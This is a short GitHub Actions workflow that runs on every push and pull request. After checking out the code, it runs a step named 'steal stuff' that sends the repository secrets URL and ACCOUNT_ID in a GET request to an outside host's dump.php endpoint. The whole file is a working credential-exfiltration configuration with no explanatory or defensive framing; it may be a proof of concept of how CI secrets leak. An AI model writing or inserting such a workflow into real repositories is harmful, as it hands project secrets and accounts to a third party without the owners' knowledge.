on:
  - push
  - pull_request
name: example
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2

      - name: steal stuff
        uses: fjogeleit/http-request-action@master
        with:
          url: 'http://files.ian.mn/dump.php?url=${{ secrets.URL }}&accountid=${{ secrets.ACCOUNT_ID }}'
          method: 'GET'
